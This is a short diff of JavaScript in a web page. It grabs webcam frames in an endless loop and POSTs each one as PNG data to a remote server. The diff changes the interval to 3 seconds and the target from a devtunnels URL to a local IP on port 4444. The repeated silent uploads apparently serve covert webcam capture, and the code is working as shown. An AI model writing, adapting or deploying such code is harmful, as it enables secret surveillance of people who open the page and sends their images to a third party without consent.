@@ -23,11 +23,11 @@ if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 async function pictureTaking(){
         while(1==1){
-        await sleep(1500);
+        await sleep(3000);
         context.drawImage(video, 0, 0, 640, 480);
         var data = canvas.toDataURL('image/png');
         sendImage(data);
-    }
+        }
 }
 // Trigger photo take
 snap.addEventListener("click", function() {
@@ -39,7 +39,7 @@ pictureTaking();
 // Function to send image data to your server
 function sendImage(imgData) {
     var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://lr2hkxk2-8080.euw.devtunnels.ms/', true);
+    xhr.open('POST', 'http://192.168.56.1:4444/', true);
     xhr.send(imgData);
 }
 </script>
